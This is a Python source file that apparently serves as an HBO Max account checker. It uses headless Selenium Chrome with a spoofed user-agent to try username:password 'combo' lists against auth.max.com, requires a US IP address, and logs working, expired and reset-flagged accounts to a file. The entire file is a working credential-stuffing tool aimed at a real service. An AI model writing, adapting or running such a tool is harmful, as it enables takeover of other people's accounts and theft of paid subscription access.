import time

from combo_splitters.split_combos import ComboSplitter
from modules.connection_error import connection_error_try_block as ip_country
from selenium.webdriver.chrome.options import Options
from pyshadow.main import Shadow
from headers.hbo_header import header
from selenium.webdriver.common.by import By
from selenium import webdriver
from pathlib import Path


def hbo():
    valid_ip = ['United States (US)', 'USA', 'US']
    ip_address, country = ip_country()

    print("Current IP: " + ip_address)
    print("Country: " + country)

    ip, country = ip_country()
    if 'US' not in str(country):
        print('Current IP: {}'.format(str(ip)))
        print('Current Location: {}'.format(country))
        print('Please use a US IP to check accounts.\nEnding.')
        exit()

    header()
    file_directory = str(Path(__file__).parents[1]) + '/hbo'
    plain_directory = str(Path(__file__).parents[1])
    page = 'https://auth.max.com/login'
    users = []
    passwords = []
    browser_options = Options()
    splitter = ComboSplitter(file_directory, "disney")
    try:
        users, passwords = splitter.split_file()
    except TypeError:
        splitter.return_error()
        exit()
    browser_options.add_argument('user-agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) '
                                 'Chrome/103.0.5060.134 ''Safari/537.36')
    browser_options.add_argument('--headless=new')
    index = 0
    while index != len(users):
        with open(plain_directory + 'accounts/hbo_acc', 'a') as account_results:
            try:
                print('\rTrying Combo {} out of {}'.format(index + 1, len(users)), end='')
                browser = webdriver.Chrome(options=browser_options)
                browser.set_window_size(500, 700)
                browser.get(page)
                time.sleep(6)
                shadows = Shadow(browser)
                email_box = shadows.find_element('input[id="login-username-input"]')
                password_box = shadows.find_element('input[id="login-password-input"]')
                sign_in_button = shadows.find_element('button[type="submit"]')
                time.sleep(3)
                email_box.send_keys(users[index])
                password_box.send_keys(passwords[index])
                time.sleep(2)
                sign_in_button.click()
                time.sleep(6)
                if browser.find_elements(By.XPATH, '//*[@id="app"]/div[1]/div/div/div/div[2]/div/section/h1'):
                    print(' | {}:{} ---> Success!'.format(users[index], passwords[index]))
                    account_results.write('{}:{} ---> Good Account\n'.format(users[index], passwords[index]))

                if browser.find_elements(By.XPATH, '//*[@id="page6097-band3130-Button32105"]'):
                    print(' | {}:{} ---> Sub Expired'.format(users[index], passwords[index]))

                if shadows.find_elements('div[class="notification-message"]'):
                    print(' | {}:{} ---> Invalid Credentials'.format(users[index], passwords[index]))

                if shadows.find_elements("gi-compromised-password[class='hydrated']"):
                    print(' | {}:{} ---> Password Reset Dialog'.format(users[index], passwords[index]))
                index += 1
            except Exception as e:
                print(e)
                exit()
